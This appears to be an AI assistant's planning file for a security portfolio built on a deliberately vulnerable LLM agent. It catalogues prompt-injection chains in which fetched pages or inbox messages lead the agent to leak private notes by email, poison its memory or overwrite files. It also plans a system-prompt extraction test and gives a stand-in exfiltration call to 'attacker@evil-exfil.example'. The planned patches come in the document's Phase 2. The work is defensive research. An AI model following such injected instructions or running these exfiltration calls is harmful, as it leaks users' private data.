# WITI Portfolio Plan — breadth-first before/after, three phases

Status: **proposed, not started.** This file is the plan only; no phase below has been
executed. See STATUS HAND-OFF in the chat turn that produced this file for exact session
state.

## Why this plan

Two proofs exist today (A standalone, A+B chain), both for the same source tool
(`fetch_url`). Every other standalone vuln (B, C, E, H — F blocked on a prerequisite) and
every chain besides A+B has zero command+output evidence, only narrative mentions in
`tracker.md`/`memory.json`/`STATUS.md`. Before any hardening happens, the "before" state
needs to be frozen for everything the portfolio will eventually claim to have fixed —
otherwise a "before/after" story can't be told for anything except A+B.

## Phase 1 — Freeze "before" proof (current state: fully v1, do this first)

One proof artifact per row below, each following the pattern already set by
`attacks/MANUAL_VULN_A.md`: inline vulnerable code (verbatim, comment marking the
weakness, code untouched), the exact command run, the captured raw output, and a note on
where a screenshot would help.

| # | Item | Type | Proof shape | Who runs it |
|---|---|---|---|---|
| 1.1 | H standalone (`read_inbox`) | structural + live | Direct call: `main.read_inbox()` against the existing seeded `inbox.json` phishing entry — show the raw string returned has no `<untrusted>` wrapping either, mirroring MANUAL_VULN_A's proof shape for A. | You |
| 1.2 | E standalone (`search_notes`) | live | Call `search_notes("private")` (or similar) directly and show `private-interview-prep.md` content returned in full despite its own header self-labeling "not for sharing" — no sensitivity check in code. | You |
| 1.3 | C standalone (`append_memory` + `update_tracker`) | live | Direct calls proving (a) `append_memory` has no size cap/sanitization/provenance tag, (b) `update_tracker` fully overwrites with no backup/append-only guard, no confirmation. | You |
| 1.4 | B standalone (`send_digest`) | live | Direct call: `send_digest("attacker@evil-exfil.example", "x", "y")` — proves recipient is 100% caller-controlled, no fixed config, no filter. | You |
| 1.5 | F standalone (prompt extraction) | **blocked** | Needs a prerequisite: add the planted `INTERNAL_OPS_KEY` secret to `prompts/system.md` per `AGENT_SYSTEM_PROMPT.md`'s v1 spec, then a chat prompt asking WITI to repeat its instructions verbatim. | You |
| 1.6 | H+B chain | live agentic | New script (same shape as `exfil_demo.py`): seed `inbox.json` with a sharper injection than the existing phishing sample, run the real loop, capture transcript. | You |
| 1.7 | A+E+B chain | live agentic | New script: fetched page instructs pulling private notes + emailing. Reuses `manual_vuln_a_payload.html` framing, extended to demand a `search_notes` call. | You |
| 1.8 | A+C chain (both append and overwrite variants) | live agentic | New script: fetched page instructs writing an injected line into memory (persistence) and/or overwriting tracker.md (destructive). Two sub-cases, one script with two payload variants. | You |
| 1.9 | H+C chain | live agentic | Inbox equivalent of 1.8. | You |
| 1.10 | D, G (structural, cross-cutting) | code inspection | Not runnable exploits — a short doc showing (a) `main.py:234-263`'s loop has no approval gate of any kind before any tool call, (b) `main.py:239-247` passes all 7 tools in every phase, no capability separation. Grep/line-cite based, no script. | You (I'll draft the doc; no command to run) |
| 1.11 | H+E+B, A+E+C, H+E+C (extra chains from §2) | live agentic | Time-permitting extensions of 1.7/1.8 patterns once those two scripts exist — same fixtures, different sink. | You |

**Standing policy (all Phase 1+ proofs, effective now):** I write every script, payload,
and fixture, but I do not execute them. For each proof I hand you: (i) the exact command(s)
to run, verbatim, ready to paste; (ii) plain-English step-by-step instructions for running
them (what order, what terminal, what to expect while it's running); (iii) a description of
what a correct/expected result looks like, specific enough that you can tell success from
failure without me interpreting it for you; and (iv) explicit guidance on whether a
screenshot would strengthen that particular proof, and exactly what should be in frame if so.

Each live-agentic item gets its own `attacks/<id>_<name>/` folder (see Phase 3 structure)
with a `BEFORE.md` write-up in the same three-sentence-story format as
`attacks/README.md` / `attacks/MANUAL_VULN_A.md`.

**Screenshots that would strengthen the report:** the PowerShell server console mid-request
for each structural proof (shows a real request landing, not a mock); the Claude Code chat
view for any chain where the model *narrates* catching an injection (more persuasive than a
pasted transcript); and — saved for Phase 3 — the before/after digest or tracker diff
side-by-side once patches exist.

## Phase 2 — Patch at chokepoints (order matters for the story)

Chokepoint analysis: every chain above starts at exactly one of two sources (A or H) and
ends at exactly one of two sinks (B or C). Patching sources kills every chain at once;
patching sinks is defense-in-depth on top of that. Recommended order:

1. **Sources first — A + H + G together.** Wrap `fetch_url` and `read_inbox` output in
   `<untrusted>...</untrusted>` markers, add the domain allow-list to `fetch_url` and a
   sender allow-list to `read_inbox`, and apply G's capability separation (no send/write
   tools reachable while untrusted content is in play). This is the single highest-leverage
   patch — re-running *every* Phase 1 chain script afterward should show all of them failing
   at the same point (the model now treats the fetched/inbox text as data), which is the
   strongest "one architectural fix, many chains die" portfolio moment.
2. **Sinks second — B then C.** Fix `send_digest`'s recipient in config + egress filter;
   make `append_memory`/`update_tracker` append-only with provenance tags and size caps.
   Re-run the chain scripts again to show they'd still fail even if a source boundary were
   somehow bypassed — defense-in-depth, not redundant with step 1.
3. **D — deterministic approval gate in code** before any irreversible tool call. Re-run
   one chain live to show it now pausing for human approval instead of auto-executing.
4. **F** — only if 1.5's prerequisite was approved and built: remove the secret from the
   prompt, move to env/vault, re-attempt extraction, show it now returns nothing sensitive.

Each patch gets an `AFTER.md` next to its `BEFORE.md`: patched code (verbatim), the same
command re-run, and the now-safe output.

**Patch-effectiveness is proven primarily at the structural layer** — e.g. the domain
allow-list now blocks the fetch, fetched text now appears inside `<untrusted>` markers, or
`send_digest` is absent from the tool list during the untrusted-processing phase. These are
deterministic and model-independent. Chain re-runs are narrative/attack-surface context, not
primary patch-proof, because the model's pre-existing tendency to refuse injections can make
the before/after behavior look identical.

## Phase 3 — Finalize for a GitHub portfolio (offensive-security / AI-security audience)

Proposed structure:

```
witi-agent/
  README.md                      <- portfolio front page: what this is, at-a-glance
                                     before/after table linking into attacks/, how to run it
  CLAUDE.md, AGENT_SYSTEM_PROMPT.md, VULN_CATALOG.md   (existing design docs, unchanged)
  main.py                        <- ends this project as the v2/hardened version
  prompts/system.md
  notes/, tracker.md, memory.json, outbox.txt, inbox.json
  attacks/
    README.md                    <- index: one row per vuln/chain, before/after links, status
    A_fetch_url/
      BEFORE.md  AFTER.md  fixtures/  *.ps1 / *.py
    B_send_digest/
      BEFORE.md  AFTER.md  ...
    C_state/
    E_search_notes/
    H_read_inbox/
    F_prompt_extraction/
    chain_AB/  chain_HB/  chain_AEB/  chain_AC/  chain_HC/  chain_extra_.../
    screenshots/
  PORTFOLIO_PLAN.md              <- this file; move to docs/ or archive once Phase 3 lands
```

Reorganizing the *existing* A+B and manual-A proof into this per-vuln-folder shape is part
of Phase 3, not Phase 1 — no need to move already-committed files until the rest of the
set exists alongside them.

**Git tagging:** currently no tags exist. Recommend tagging the end of Phase 1 as
`v1-vulnerable-full` (everything above frozen, nothing patched) and the end of Phase 2 as
`v2-hardened-full`, so a reviewer can `git checkout` either state directly instead of
reading diffs — a strong, concrete artifact for a hiring manager to poke at.

## Open decisions before Phase 1 starts
- Approve or defer 1.5's prerequisite (planting the F secret in `prompts/system.md`).
- Confirm folder-per-vuln reorg (Phase 3) is wanted, vs. keeping the current flat
  `attacks/` layout.
